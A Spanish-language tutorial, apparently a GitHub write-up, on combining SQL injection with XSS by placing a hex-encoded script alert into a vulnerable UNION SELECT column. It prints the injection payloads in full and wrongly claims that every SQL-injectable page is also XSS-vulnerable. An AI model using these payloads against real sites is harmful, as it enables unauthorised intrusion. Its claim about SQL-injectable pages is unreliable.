# One shot payload sql and xss

En este escrito me gustaría compartir una de mis mezclas favoritas, en donde se combina una inyeccion xss dentro de una inyeccion sql para asi poder mostrar el resultado de la inyeccion sql dentro de un alert gracias a la inyeccion xss, puede sonar loco o complicado pero no, es bastante facil y trataré de explicarlo paso a paso, aqui un ejemplo del resultado: 

![](ejemplos/1.png)

Para empezar tenemos que recordar bien como se comporta una inyeccion sql, ya que, para poder insertar este payload tenemos que hacerlo en una comlumna vulnerable, para recordar bien esto recomiendo pasar por el escrito de inyecciones sql:

https://github.com/Y000o/sql_injection_basic/blob/master/sql_injection_basic.md

Una vez que tengamos la pagina con la inyeccion sql lista y tengamos el numero de columnas descubiertas, podemos empezar:

![](ejemplos/2.png)

En este caso la pagina que utilizaré tiene 21 columnas y las columnas vulnerables son 16, 17 y la numero 18. Yo estare trabajando con la numero 18.

Recordemos que siempre que una pagina es vulnerable a inyecciones sql tambien es vulnerable a inyecciones xss, para poder inyectar xss dentro de sql se hace lo siguiente:

1 - Primero se identifica la columna vulnerable con la cual se va a trabajar (en este caso la numero 18):

        `union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21+--+`

2 - Inyectamos el payload xss dentro de la columna:

        `union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,<script>alert("_Y000!_")</script>,19,20,21+--+
        
3 - Para que se mueste correctamente la inyeccion xss tenemos que pasar el codico a hexadecimal:

        `union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,0x3c7363726970743e616c65727428225f59303030215f22293c2f7363726970743e,19,20,21+--+`
        
4 - El resultado es el siguiente:         

![](ejemplos/3.png)
